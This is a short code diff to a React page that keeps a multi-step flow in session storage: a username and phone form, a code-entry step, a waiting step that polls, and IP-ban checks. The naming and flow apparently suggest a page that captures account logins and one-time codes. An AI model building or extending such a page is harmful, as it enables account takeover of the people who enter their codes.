@@ -10,16 +10,32 @@ import { supabase } from "@/integrations/supabase/client";
 
 type Step = "form" | "code" | "waiting" | "success" | "banned";
 
+const STORAGE_KEY = "snap_flow_state_v1";
+
 const Index = () => {
-  const [step, setStep] = useState<Step>("form");
-  const [formData, setFormData] = useState({ username: "", phone: "" });
-  const [submissionId, setSubmissionId] = useState<string | null>(null);
+  const [step, setStep] = useState<Step>(() => {
+    try { return (JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").step) || "form"; } catch { return "form"; }
+  });
+  const [formData, setFormData] = useState(() => {
+    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").formData || { username: "", phone: "" }; } catch { return { username: "", phone: "" }; }
+  });
+  const [submissionId, setSubmissionId] = useState<string | null>(() => {
+    try { return JSON.parse(sessionStorage.getItem(STORAGE_KEY) || "{}").submissionId || null; } catch { return null; }
+  });
   const [codeError, setCodeError] = useState("");
   const [formError, setFormError] = useState("");
   const [banReason, setBanReason] = useState<string | null>(null);
   const visitTracked = useRef(false);
   const formSubmittingRef = useRef(false);
   const ipChecked = useRef(false);
+
+  // Persist flow state across reloads so polling can resume
+  useEffect(() => {
+    try {
+      sessionStorage.setItem(STORAGE_KEY, JSON.stringify({ step, submissionId, formData }));
+    } catch { /* noop */ }
+  }, [step, submissionId, formData]);
+
 
   // Vérifier si l'IP est bannie
   useEffect(() => {
